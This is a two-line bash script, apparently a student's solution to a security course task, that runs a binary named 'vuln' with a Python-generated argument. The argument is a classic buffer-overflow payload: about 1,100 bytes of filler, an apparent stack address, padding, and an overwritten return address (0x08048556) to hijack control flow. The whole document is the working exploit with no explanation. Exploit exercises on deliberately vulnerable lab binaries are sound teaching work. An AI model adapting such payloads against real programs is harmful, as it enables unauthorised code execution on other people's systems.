#!/usr/bin/env bash
/task2/s1813674/vuln "$(python -c "print('\xff\xfd'*554 + '\xe0\xd0\xff\xff' + '\xff'*24 + '\x56\x85\x04\x08')")"
